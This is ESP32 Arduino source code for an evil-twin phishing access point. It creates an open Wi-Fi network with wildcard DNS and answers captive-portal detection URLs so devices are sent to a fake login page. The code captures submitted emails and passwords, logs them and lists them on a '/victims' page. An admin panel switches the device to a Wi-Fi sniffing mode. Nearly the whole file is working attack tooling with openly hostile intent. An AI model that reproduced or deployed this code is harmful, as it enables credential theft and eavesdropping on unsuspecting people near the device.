#include <Arduino.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebSrv.h>
#include <vector>
#include <WiFi.h>                 
#include <SPI.h>                  
#include <time.h>                 
#include <DNSServer.h>
#include "sniff_lib.h"
#include "main.h"


void notFound(AsyncWebServerRequest *request) {
  request->send(404, "text/plain", "Not found");
}


void setup_sniff(String ssid, String password){
  //criar 5 redes com o mesmo ssid
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid,password);
  Serial.println("\nConnecting");
  while(WiFi.status() != WL_CONNECTED){
     Serial.print(".");
     delay(100);
    }

  changed = false;
}

void setup_phishing_ap(String ssid){
  dns.setTTL(300);
  WiFi.mode(WIFI_AP);

  const IPAddress IP(4, 3, 2, 1);       
  const IPAddress gatewayIP(4, 3, 2, 1);      
  const IPAddress subnetMask(255, 255, 255, 0); 
  WiFi.softAPConfig(IP, gatewayIP, subnetMask);
 if (!WiFi.softAP(ssid)) { 
    log_e("Soft AP creation failed.");
    while(1);
  }
  Serial.print("AP IP: ");
  Serial.println(IP);
  server.begin();

  Serial.println("----\nSTATUS: SERVER STATERD\nInfo:Esperando input da vítima");

  dns.setErrorReplyCode(DNSReplyCode::ServerFailure);

  dns.start(DNS_PORT, "*", IP);

  server.on("/adm",HTTP_GET,[](AsyncWebServerRequest *request){request->send_P(200,"text/html", adm_html);});
  
  server.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); }); 
  server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });

  server.on("/generate_204", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });       
  server.on("/redirect", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });         
  server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); }); 
  server.on("/canonical.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });     
  server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });             
  server.on("/ncsi.txt", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });  
 
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send_P(200, "text/html", index_html);
  });


  server.on("/adm/GET",HTTP_GET,[](AsyncWebServerRequest *request){
    
   });
    
  server.on("/GET", HTTP_GET, [] (AsyncWebServerRequest *request) {
    String email;
    String password;
    if (request->hasParam(EMAIL)) {
      email = request->getParam(EMAIL)->value();
      password = request->getParam(PASSWORD)->value();
      emails.push_back(email);
      passwords.push_back(password);
      Serial.print("Email: ");
      Serial.println(email);
      Serial.print("Password: ");
      Serial.println(password);
      request->send(200, "text/html", "HTTP GET request sent to your ESP on input field (login ) with value: " + email +  password  + "<br><a href=\"/\">Return to Home Page</a>");
      }
    
    else {
      email = "empty";
    }

    String modo;
    String ssid;
    if(request->hasParam(SSID)){
      modo = request->getParam(MODO)->value();
      ssid = request->getParam(SSID)->value();
      a_password = request->getParam(PASSWORD)->value();
      Serial.println(modo);
      Serial.println(ssid);
      Serial.println(actual);
      Serial.println(a_ssid);
      if(modo != actual){
        actual = modo;
        changed = true; 
      }
      if(ssid != a_ssid){
        a_ssid = ssid;
        changed = true;
      }
      if(actual == "sniff" && modo == "phishing"){
        request_restart = true;
      }
      
    } 
  });

  server.on("/victims", HTTP_GET, [] (AsyncWebServerRequest *request) {
    String html = PROGMEM R"rawliteral(<!DOCTYPE html><html><section style="display: flex; flex-direction: column; width: 100%; justify-content: center; align-items: center"> <h2 style="margin-bottom: 30px;">Vítimas >:)</h2> <table style="width: 50%; text-align:center; border: 1px solid black"> <thead> <th>Username</th> <th>Password</th> </thead> <tbody>)rawliteral";
    String html2 = PROGMEM R"rawliteral(</tbody> </table></section></html>)rawliteral";
    String response;
    for(size_t i = 0;i < emails.size(); i++){
      response += "<tr><td>" + emails[i]+"</td><td>"+passwords[i]+"</td></tr>" ;
    }
    html += response;
    html += html2;
    request->send(200, "text/html",html);
  });
  server.onNotFound(notFound);
  server.begin();
  
  changed = false;
}





void setup() {
  Serial.begin(115200);
  const char* ssid = "ESP32";
  setup_phishing_ap(ssid);
  
}

void loop() {
  dns.processNextRequest();
  if(request_restart){
    WiFi.mode(WIFI_OFF);
    setup_phishing_ap(a_ssid);
    request_restart = false;
  }
  if(changed){
    if(actual == "phishing"){
      setup_phishing_ap(a_ssid);
      }
    if(actual == "sniff"){
      setup_sniff(a_ssid,a_password);
      }
  }
  else if(actual =="sniff"){
    wifi_sniffer_init();
    vTaskDelay(WIFI_CHANNEL_SWITCH_INTERVAL / portTICK_PERIOD_MS);
    wifi_sniffer_set_channel(channel);
    channel = (channel % WIFI_CHANNEL_MAX) + 1;
    }
  delay(50);
}
